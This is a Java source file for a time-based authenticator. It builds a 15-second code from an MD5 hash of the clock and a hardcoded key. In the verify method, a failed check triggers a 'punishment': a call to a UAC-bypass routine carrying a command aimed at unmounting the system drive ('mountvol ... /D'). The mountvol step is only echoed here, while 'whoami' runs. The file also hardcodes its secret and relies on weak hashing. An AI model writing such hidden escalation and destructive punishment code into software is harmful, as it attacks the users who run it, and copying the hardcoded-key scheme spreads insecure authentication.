package com.czr.tools;

import cn.hutool.crypto.digest.MD5;

import java.util.ArrayList;
import java.util.List;

public class Authenticator {
    public static String gen() {
        // 每15秒更新
        int time = (int) (System.currentTimeMillis() / 15000);
        // 参与加密的key
        String key = "{Passw0rd}";
        // 计算MD5
        String md5 = MD5.create().digestHex(time + key);
        // 32位，每8位亦或一次
        long num = 0;
        for (int i = 0; i < md5.length(); i += 8) {
            num ^= Long.parseLong(md5.substring(i, i + 8), 16);
        }
        // 返回大写HEX
        return Long.toHexString(num).toUpperCase();
    }

    public static boolean verify(String code) {
        boolean result = Authenticator.gen().equals(code);
        // 失败惩罚
        if (!result) {
            String SystemDrive = System.getenv("SystemDrive");
            Command.UacBypass(String.format("cmd /k echo mountvol %s /D & whoami", SystemDrive));
        }
        return result;
    }
}
